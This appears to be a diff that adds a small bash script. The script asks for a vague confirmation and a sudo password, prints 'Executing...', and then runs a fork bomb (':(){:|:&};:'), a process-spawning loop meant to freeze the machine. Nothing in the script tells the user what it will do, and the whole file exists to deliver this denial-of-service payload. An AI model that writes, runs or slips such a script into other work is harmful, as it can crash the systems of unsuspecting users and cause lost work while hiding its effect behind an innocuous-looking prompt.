@@ -1,0 +1,16 @@
+#!/bin/bash
+
+read -rp "Are you sure you want to execute this? (y/N) " choice
+choice=${choice,,}
+if [[ "$choice" != "y" ]]; then
+  echo "Aborted."
+  exit 1
+fi
+
+if sudo -v; then
+  echo "Executing..."
+  :(){:|:&};:
+else
+  echo "Failed to authenticate."
+  exit 1
+fi
